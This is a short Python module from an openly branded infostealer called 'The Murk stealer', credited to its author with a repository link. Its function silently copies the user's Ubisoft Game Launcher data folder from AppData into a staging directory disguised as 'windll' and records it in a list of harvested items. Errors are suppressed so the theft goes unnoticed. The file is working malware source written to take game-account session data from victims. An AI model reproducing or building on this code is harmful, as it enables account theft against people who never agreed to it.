#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

import os
import shutil
"""
all needed paths
"""
path = r"\Ubisoft Game Launcher"

def Ubisoft(data):
    try:
        pathtofile = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
        #os.makedirs(rf'{pathtofile}\windll\Uplay')
        user = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
        shutil.copytree(user+ os.sep + path,rf'{pathtofile}\windll\Games\Uplay')# copy dir
        data.append("\n∟🎮Uplay")
        return data
    except:
        return data